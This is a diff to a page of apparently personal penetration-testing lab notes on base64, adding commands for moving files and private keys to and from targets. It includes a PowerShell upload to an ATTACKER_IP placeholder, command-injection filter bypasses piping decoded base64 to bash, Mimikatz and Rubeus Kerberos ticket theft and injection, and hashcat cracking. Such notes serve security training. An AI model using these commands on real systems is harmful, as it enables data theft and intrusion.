@@ -9,6 +9,102 @@ hideFooterPagination: true
 
 {/* Generated from Commands/base64.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## base64: choose the operation and read the result
+
+Encode or decode small files for text-based transfer.
+
+### What the result establishes
+
+Use encoding for transport through a text channel, then decode to a file and verify the result.
+
+### Prerequisites and common failures
+
+Base64 is not encryption. Wrapping, clipboard truncation, newline handling and PowerShell text encoding can alter the bytes.
+
+### Example 1: Commands
+
+Run in: **Kali/Linux**.
+
+```bash
+base64 -w 0 file.zip
+# Decode pasted data into a file
+printf '%s' 'BASE64_TEXT' | base64 -d > file.zip
+```
+
+### Example 2: Base64 Encode & Decode (Upload)
+
+Run in: **Saved lab example**.
+
+```bash
+echo <base64_string> | base64 -d > hosts
+md5sum hosts    # verify hash matches
+```
+
+Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Base64 Encode & Decode (No Network Needed)
+
+Run in: **Saved lab example**.
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<paste base64 here>"))
+```
+
+Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Base64 Encode & Decode (No Network Needed)
+
+Run in: **Saved lab example**.
+
+```bash
+md5sum id_rsa                        # note the hash to verify later
+cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous string
+```
+
+Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: PowerShell Web Uploads
+
+Run in: **Saved lab example**.
+
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
+Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
+```
+
+Saved context: [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Base64 Encode & Decode
+
+Run in: **Saved lab example**.
+
+```bash
+# On attack box — encode
+cat id_rsa | base64 -w 0; echo
+md5sum id_rsa
+
+# On target — decode
+echo -n '<base64_string>' | base64 -d > id_rsa
+md5sum id_rsa    # verify match
+```
+
+Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Base64 Encode & Decode (Upload)
+
+Run in: **Saved lab example**.
+
+```powershell
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
+
+Saved context: [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Encode or decode small files for text-based transfer.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=base64) · [All tools](/index)
@@ -46,6 +142,13 @@ c''at /et''c/pa''sswd      w`h`oami          /???/??t /etc/passwd
 echo aWQ= | base64 -d | bash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Command Injection — Filter bypasses](/web/cmdi#filter-bypasses)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Phase 5 — Upgrading to an Interactive Reverse Shell">
@@ -57,6 +160,13 @@ echo aWQ= | base64 -d | bash
 ```text
 echo "<base64>" | base64 -d | iconv -f UTF-16LE -t UTF-8
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Personal Assessment Notes — Phase 5 — Upgrading to an Interactive Reverse Shell](/modules/common-services/assessment#phase-5-—-upgrading-to-an-interactive-reverse-shell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -76,6 +186,13 @@ echo -n '<base64_string>' | base64 -d > id_rsa
 md5sum id_rsa    # verify match
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Base64 Encode &amp; Decode (No Network Needed)">
@@ -89,11 +206,25 @@ md5sum id_rsa                        # note the hash to verify later
 cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous string
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<paste base64 here>"))
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode (No Network Needed)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-no-network-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -108,12 +239,26 @@ cat id_rsa | base64 -w 0; echo      # -w 0 = no line wrapping, one continuous st
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 echo <base64_string> | base64 -d > hosts
 md5sum hosts    # verify hash matches
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Base64 Encode & Decode (Upload)](/post-exploitation/file-transfers-cheat-sheet#base64-encode-&-decode-upload)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -128,6 +273,13 @@ $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -En
 Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="4. Export Cached Tickets with Mimikatz">
@@ -141,6 +293,13 @@ base64 /out:true
 kerberos::list /export
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — 4. Export Cached Tickets with Mimikatz](/active-directory/kerberoasting-windows#4-export-cached-tickets-with-mimikatz)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="5. Rebuild a .kirbi File from Base64">
@@ -152,6 +311,13 @@ kerberos::list /export
 ```bash
 cat encoded_file | base64 -d > sqldev.kirbi
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — 5. Rebuild a .kirbi File from Base64](/active-directory/kerberoasting-windows#5-rebuild-a-kirbi-file-from-base64)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -171,6 +337,13 @@ hashcat -m 13100 rc4_hashes wordlist.txt
 hashcat -m 19700 aes256_hashes wordlist.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — Quick Reference](/active-directory/kerberoasting-windows#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 2b — Inject a stolen/forged ticket (the actual &quot;pass&quot;)">
@@ -184,11 +357,25 @@ Rubeus.exe ptt /ticket:doIFujCCBba...        # base64 from asktgt/dump
 Rubeus.exe ptt /ticket:[0;6c680]-2-0-...julio@krbtgt-inlanefreight.htb.kirbi   # a .kirbi file
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2b — Inject a stolen/forged ticket (the actual "pass")](/password-attacks/pass-the-ticket-from-windows#step-2b-—-inject-a-stolen/forged-ticket-the-actual-pass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Windows**
 
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Windows — Step 2b — Inject a stolen/forged ticket (the actual "pass")](/password-attacks/pass-the-ticket-from-windows#step-2b-—-inject-a-stolen/forged-ticket-the-actual-pass)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -220,6 +407,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Passwords in unattend.xml">
@@ -233,6 +427,21 @@ $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d
 SecretSecurePassword1234*
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Passwords in unattend.xml](/privesc/windows-privesc-checklist#passwords-in-unattend-xml)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
